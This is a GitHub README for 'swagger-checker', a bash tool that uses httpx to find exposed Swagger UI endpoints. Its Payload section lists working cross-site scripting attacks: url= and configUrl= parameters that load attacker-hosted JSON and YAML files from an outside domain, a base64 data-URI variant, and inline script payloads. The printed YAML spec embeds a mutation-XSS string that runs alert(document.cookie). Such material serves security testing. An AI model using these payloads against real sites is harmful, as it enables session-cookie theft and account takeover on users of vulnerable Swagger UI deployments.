# **swagger-checker**
<a href="https://asciinema.org/a/587848" target="_blank"><img src="https://asciinema.org/a/587848.svg" /></a>

Swagger UI Checker is a tool used to check Swagger UI endpoints. It verifies the presence of Swagger UI by sending HTTP requests to specified URLs and paths. This tool relies on the httpx command-line tool for making HTTP requests. Before using Swagger UI Checker, ensure that you have httpx installed.

## **Requirements**

- **httpx** :
This tool is required for sending HTTP requests and retrieving responses. You can install it using the package manager of your choice or by following the installation    instructions provided by the httpx project.
#### Installation Instructions

   `httpx` requires **go1.19** to install successfully. Run the following command to get the repo:
  
   ```sh
   go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
   ```
   **or**
   ```sh
   git clone https://github.com/projectdiscovery/httpx.git; \
   cd httpx/cmd/httpx; \
   go build; \
   mv httpx /usr/local/bin/; \
   httpx -version;
   ```
## **installation**
```sh
git clone https://github.com/Yudha-ard/swagger-checker.git
chmod +x swagger.sh
```

## **Usage**
```sh
./swagger.sh sites.txt swagger.txt 
```
## **Payload**

***Example*** : {site}/{swagger_endpoint}?{parameter}={payload}
- site.com/swagger?url=https://codelatte.id/xss.yaml
- site.com/swagger?configUrl=https://codelatte.id/xss.json
- site.com/swagger/?url=https://codelatte.id/xss.yaml
- site.com/swagger/?configUrl=https://codelatte.id/xss.json
- site.com/swagger/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9jb2RlbGF0dGUuaWQveHNzLnlhbWwiCn0=
- site.com/swagger/?url=%3Cscript%3Ealert(atob(%22MQ==%22))%3C/script%3E
- site.com/swagger?url=%3Cscript%3Ealert(atob(%22MQ==%22))%3C/script%3E

**https://codelatte.id/xss.json**
```
{
    "url": "https://codelatte.id/xss.yaml",
    "urls": [
        {
            "url": "https://codelatte.id/xss.yaml",
            "name": "XSS Document"
        }
    ]
}

```
**https://codelatte.id/xss.yaml**
```
swagger: '2.0'
info:
  title: Classic API Resource Documentation
  description: |
    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>

  version: production
basePath: /JSSResource/
produces:
  - application/xml
  - application/json
consumes:
  - application/xml
  - application/json
security:
  - basicAuth: []
paths:
  /accounts:
    get:
      responses:
        '200':
          description: No response was specified
      tags:
        - accounts
      operationId: findAccounts
      summary: Finds all accounts
  '/accounts/groupid/{id}':
...
```

**base64encode**
```
ewoidXJsIjoiaHR0cHM6Ly9jb2RlbGF0dGUuaWQveHNzLnlhbWwiCn0=
```
**base64decode**
```
{
   "url":"https://codelatte.id/xss.yaml"
}
```
## **References**

- https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
- https://medium.com/@ghostlulzhacks/swagger-api-c07eca05441e
